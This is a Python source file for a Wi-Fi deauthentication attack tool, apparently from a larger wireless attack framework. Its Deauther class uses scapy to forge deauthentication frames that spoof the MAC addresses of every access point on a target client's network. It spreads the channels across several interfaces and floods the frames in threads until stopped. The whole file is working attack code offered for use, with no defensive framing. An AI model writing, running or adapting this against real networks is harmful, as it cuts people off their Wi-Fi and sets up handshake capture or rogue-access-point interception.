import threading
from scapy.all import Dot11, RadioTap, sendp, Dot11Deauth
import ifConfig

from logging_config import setup_logger

logger = setup_logger(__name__)

class Deauther:
    def __init__(self,db_interface,interfaces,target,entire_ssid):
        self.db_interface = db_interface
        self.interfaces = interfaces
        self.target = target
        self.entire_ssid = entire_ssid
        self.stop_event = threading.Event()
        self.threads = []


    def start(self):
        self.stop_event.clear()
        if self.entire_ssid:
            ssid = self.db_interface.get_client_ssid(self.target)
            aps = self.db_interface.get_aps_by_ssid(ssid)

            # Equaly distribute the channels to hop among the interfaces
            unique_channels = list(set([ap['channel'] for ap in aps]))
            cpi = len(unique_channels)/len(self.interfaces) # Channels per interface
            for i, interface in enumerate(self.interfaces):
                interface_channels = unique_channels[round(i*cpi):round((i+1)*cpi)]
                if interface_channels:
                    frames_to_send = []
                    channels_to_send = []
                    for ap in aps:
                        if ap['channel'] in interface_channels:
                            channels_to_send.append(ap['channel'])
                            dot11 = Dot11(addr1=self._format_mac_address(self.target), addr2=self._format_mac_address(ap['mac']), addr3=self._format_mac_address(ap['mac']))
                            frames_to_send.append(RadioTap()/dot11/Dot11Deauth(reason=0))
                    
                    th = threading.Thread(target=self._deauth_interface_thread,args=(interface,frames_to_send,channels_to_send))
                    th.daemon = True
                    th.name = "Deauther:" + str(interface)
                    self.threads.append(th)
                    th.start()

    def _deauth_interface_thread(self,interface,frames,channels):
        logger.debug("Deauth started on " + str(interface) + " Channels:" + str(channels))
        prev_channel = channels[0]
        ifConfig.setChannel(interface,prev_channel)
        while not self.stop_event.is_set():
            for i, frame in enumerate(frames):
                if channels[i] != prev_channel:
                    ifConfig.setChannel(interface,channels[i])
                    prev_channel = channels[i]
                sendp(frame, iface=interface)
                logger.debug("Sending deauth on channel " + str(channels[i]) +" on interface " + interface + " from " + frame.addr1 + " to:" + frame.addr2)

    
    def stop(self):
        self.stop_event.set()
        for thread in self.threads:
            thread.join()
        self.threads = []
        logger.debug("Deauth threads: stopped")

    def _format_mac_address(self,mac):
        if len(mac) != 12:
                raise ValueError("MAC address must be 12 hexadecimal characters long")
        formatted_mac = ":".join(mac[i:i+2] for i in range(0, 12, 2))
        return formatted_mac
